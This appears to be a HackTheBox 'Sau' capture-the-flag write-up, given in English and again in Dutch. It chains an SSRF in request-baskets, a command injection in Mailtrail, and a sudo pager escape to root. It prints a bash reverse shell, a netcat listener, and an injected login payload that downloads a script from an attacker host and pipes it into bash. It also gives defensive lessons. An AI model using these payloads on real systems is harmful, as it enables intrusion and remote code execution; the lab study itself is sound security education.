HackTheBox — Sau (Easy) Writeup

Recon

An initial Nmap scan of the target revealed three notable ports:

nmap -sC -sV -p- -oN sau_full.nmap <target_ip>

| Port | State | Service |
|-------|----------|--------------------------------------|
| 22 | open | OpenSSH 8.2p1 |
| 80 | filtered | HTTP (not directly reachable) |
| 55555 | open | Golang HTTP server — request-baskets v1.2.1 |

Port 80 being filtered was immediately interesting — it suggested a web service bound to localhost or blocked by firewall rules, potentially reachable only from the inside.

Browsing to port 55555 revealed request-baskets v1.2.1, an open-source service that creates temporary HTTP endpoints ("baskets") and captures incoming requests. Research quickly turned up CVE-2023-27163, a Server-Side Request Forgery (SSRF) vulnerability that allows an attacker to configure a basket's forward_url to an arbitrary internal address and have the response proxied back to the client. This made the filtered port 80 a prime target.

Exploitation

Step 1 — SSRF via request-baskets (CVE-2023-27163)

A new basket was created through the web UI on port 55555 with the following configuration:

| Setting | Value |
|------------------|------------------------|
| forward_url | http://127.0.0.1:80 |
| proxy_response | true |

Accessing the generated basket URL (http://<target_ip>:55555/<basket_id>) now transparently forwarded requests to the internal service on port 80 and returned its responses. The internal application identified itself as Mailtrail v0.53.

Step 2 — Unauthenticated OS Command Injection in Mailtrail v0.53

Mailtrail v0.53 is vulnerable to an unauthenticated OS command injection in the username parameter of the login form. The parameter value is passed unsanitized to a shell command on the server.

A reverse shell was staged as follows:

1. Create the payload file (shell.sh) on the attacker machine:

#!/bin/bash
bash -i >& /dev/tcp/<attacker_ip>/9001 0>&1

2. Serve the payload via a Python HTTP server:

python3 -m http.server 8000

3. Start a Netcat listener:

nc -lvnp 9001

4. Trigger the injection by sending a crafted login request through the SSRF basket:

curl 'http://<target_ip>:55555/<basket_id>/login' \
  --data 'username=;curl+http://<attacker_ip>:8000/shell.sh|bash'

The semicolon breaks out of the original command context, downloads shell.sh, and pipes it into bash.

Result: A reverse shell as the user puma, and access to user.txt.

Privilege Escalation

With a shell as puma, the first step was checking sudo privileges:

puma@sau:~$ sudo -l
User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service

systemctl status invokes a pager (typically less) when the output exceeds the terminal height. Because the command runs as root via sudo, the pager also runs as root.

less allows spawning a shell with the ! command:

puma@sau:~$ sudo /usr/bin/systemctl status trail.service

Once inside the less pager:

!sh

Result: A root shell, and access to root.txt.

> This technique is documented on [GTFOBins — systemctl](https://gtfobins.github.io/gtfobins/systemctl/).

Lessons Learned

1. SSRF as a gateway: A seemingly low-impact SSRF in request-baskets turned a filtered, "unreachable" internal service into a fully accessible attack surface. Never assume network-level filtering is sufficient when an SSRF vector exists on the same host.

2. Patch third-party components: Both request-baskets (v1.2.1) and Mailtrail (v0.53) were running known-vulnerable versions with public CVEs and exploit code. Timely patching of either would have broken the kill chain.

3. Sudo + pagers = danger: Granting passwordless sudo on systemctl status appears harmless but implicitly grants root shell access through the pager. Least-privilege policies should account for the transitive capabilities of every invoked subprocess. Using LESSSECURE=1 or replacing the pager with cat would mitigate this.

4. Defense in depth matters: The compromise required chaining three distinct weaknesses (SSRF → command injection → sudo misconfiguration). Mitigating any single link would have prevented full compromise.

HackTheBox — Sau (Easy) Writeup

Verkenning

Een initiële Nmap-scan van het doelwit onthulde drie opvallende poorten:

nmap -sC -sV -p- -oN sau_full.nmap <target_ip>

| Poort | Status | Dienst |
|-------|-----------|-----------------------------------------------|
| 22 | open | OpenSSH 8.2p1 |
| 80 | gefilterd | HTTP (niet direct bereikbaar) |
| 55555 | open | Golang HTTP-server — request-baskets v1.2.1 |

Poort 80 was gefilterd — meteen interessant. Dit wees op een webdienst die gebonden was aan localhost of geblokkeerd door firewallregels, en mogelijk alleen bereikbaar van binnenuit.

Browsen naar poort 55555 onthulde request-baskets v1.2.1, een open-source dienst die tijdelijke HTTP-eindpunten ("baskets") aanmaakt en inkomende verzoeken opslaat. Onderzoek bracht snel CVE-2023-27163 aan het licht: een Server-Side Request Forgery (SSRF)-kwetsbaarheid waarmee een aanvaller de forward_url van een basket naar een willekeurig intern adres kan configureren en de reactie teruggespiegeld krijgt. Gefilterde poort 80 was daarmee een voor de hand liggend doelwit.

Uitbuiting

Stap 1 — SSRF via request-baskets (CVE-2023-27163)

Via de webinterface op poort 55555 werd een nieuwe basket aangemaakt met de volgende instelling:

| Instelling | Waarde |
|------------------|------------------------|
| forward_url | http://127.0.0.1:80 |
| proxy_response | true |

Het bezoeken van de gegenereerde basket-URL (http://<target_ip>:55555/<basket_id>) stuurde verzoeken nu transparant door naar de interne dienst op poort 80 en gaf de reacties terug. De interne applicatie identificeerde zichzelf als Mailtrail v0.53.

Stap 2 — Niet-geauthenticeerde OS Command Injection in Mailtrail v0.53

Mailtrail v0.53 is kwetsbaar voor een niet-geauthenticeerde OS command injection in de username-parameter van het inlogformulier. De parameterwaarde wordt zonder sanitisatie doorgegeven aan een shell-commando op de server.

Een reverse shell werd als volgt opgezet:

1. Maak het payload-bestand aan (shell.sh) op de aanvallende machine:

#!/bin/bash
bash -i >& /dev/tcp/<attacker_ip>/9001 0>&1

2. Serveer de payload via een Python HTTP-server:

python3 -m http.server 8000

3. Start een Netcat listener:

nc -lvnp 9001

4. Activeer de injectie door een speciaal crafted inlogverzoek te sturen via de SSRF-basket:

curl 'http://<target_ip>:55555/<basket_id>/login' \
  --data 'username=;curl+http://<attacker_ip>:8000/shell.sh|bash'

De puntkomma breekt uit de oorspronkelijke commandocontext, downloadt shell.sh en stuurt het door naar bash.

Resultaat: Een reverse shell als gebruiker puma, en toegang tot user.txt.

Privilege Escalation

Met een shell als puma was de eerste stap het controleren van sudo-rechten:

puma@sau:~$ sudo -l
User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service

systemctl status roept een pager (doorgaans less) aan wanneer de uitvoer de terminalgrootte overschrijdt. Omdat het commando via sudo als root draait, draait de pager ook als root.

less staat toe een shell te starten met het !-commando:

puma@sau:~$ sudo /usr/bin/systemctl status trail.service

Eenmaal in de less-pager:

!sh

Resultaat: Een root-shell, en toegang tot root.txt.

> Deze techniek staat gedocumenteerd op [GTFOBins — systemctl](https://gtfobins.github.io/gtfobins/systemctl/).

Geleerde lessen

1. SSRF als toegangspoort: Een ogenschijnlijk laag-risico SSRF in request-baskets maakte van een gefilterde, "onbereikbare" interne dienst een volledig toegankelijk aanvalsoppervlak. Ga nooit ervan uit dat netwerkfiltering voldoende is zolang er een SSRF-vector bestaat op dezelfde host.

2. Patch externe componenten: Zowel request-baskets (v1.2.1) als Mailtrail (v0.53) draaiden op kwetsbare versies met bekende CVE's en publiek beschikbare exploitcode. Tijdig patchen van één van beide had de aanvalsketen gebroken.

3. Sudo + pagers = gevaar: Het verlenen van wachtwoordloze sudo op systemctl status lijkt onschuldig, maar geeft impliciet root-shell toegang via de pager. Least-privilege-beleid moet rekening houden met de transitieve mogelijkheden van elk aangeroepen subproces. Het gebruik van LESSSECURE=1 of het vervangen van de pager door cat zou dit verhelpen.

4. Defense in depth telt: De aanval vereiste het koppelen van drie afzonderlijke zwakheden (SSRF → command injection → sudo-misconfiguratie). Het aanpakken van één enkele schakel had volledige compromittering voorkomen.
